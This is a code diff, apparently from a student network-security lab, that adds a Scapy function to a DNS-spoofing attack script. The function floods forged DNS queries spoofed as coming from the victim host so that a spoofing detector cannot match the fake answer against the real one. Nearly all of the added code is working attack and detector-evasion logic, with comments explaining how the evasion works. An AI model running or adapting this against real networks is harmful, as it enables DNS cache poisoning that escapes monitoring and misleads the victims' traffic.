@@ -39,3 +39,48 @@ def create_request(IP_src_dst, qname):
 
     request = create_IP_Packet(IP_src_dst)/create_UDP_Packet()/create_DNS_Packet(qname)
     return request
+
+#############################################################################
+############################### ALI HIJJAWI #################################
+
+import time
+
+# The main attack function
+def executeAvoidanceAttack():
+    
+    # Here, the attack is based on a smart avoidance technique to fool the detection algorithm
+    # the attacker floods the victim with DNS queries as if requested by the victim themselves,
+    # in such a way to have the detection algorithm not be able to compare the spoofed false DNS answer
+    # from the attacker and the real DNS answer from the DNS server
+    for i in range(800):
+
+        # here, the fake domain should not be the same as of the main attackv1.py, since if they were, then the attack's machine
+        # will sniff these packets as if they are DNS queries sent by the victim
+        target = '10.9.0.5'
+        fakeDomain = '1.2.3.4'
+
+        # we start the flooding of the victim with DNS queries so that the detection awaits an answer.
+        # we reply to the main DNS query with the fake domain, and then the algorithm only sees one answer,
+        # and then a query so it detects again for different answers, in whic the DNS real answer comes back
+        # and the detection considers it a valid answer. No same query had two answers.
+        # notice is issam's functions, how the source is set as the victim so that the detection sniffs those
+        # packets and awaits an answer
+        forgedDNSQueryPacket = create_request(target, fakeDomain)
+        send(forgedDNSQueryPacket)
+
+        # after experimentation, we saw that having the split time between packets as 0.1 best, since the DNS
+        # server replies with the real answer shortly after we send the fake DNS answer
+        time.sleep(0.1)
+
+
+
+# removed for better execution: use these for an isolated flood
+# target = '10.9.0.5'
+# # here, the fake domain should not be the same as of the main attackv1.py, since if they were, then the attack's machine
+# # will sniff these packets as if they are DNS queries sent by the victim
+# fakeDomain = '1.2.3.4'
+
+# # a filter to sniff packets specifically sent by this host towards port 53 - which is the local DNS server
+# packetFilter = 'udp and src host 10.9.0.5 and dst port 53'
+# # the scapy sniff function; it executes the attack as soon as it sniffs the DNS query packet
+# sniffedPacket = sniff(iface = 'br-68a034f7b70c', filter = packetFilter, prn = executeAvoidanceAttack(target, fakeDomain))
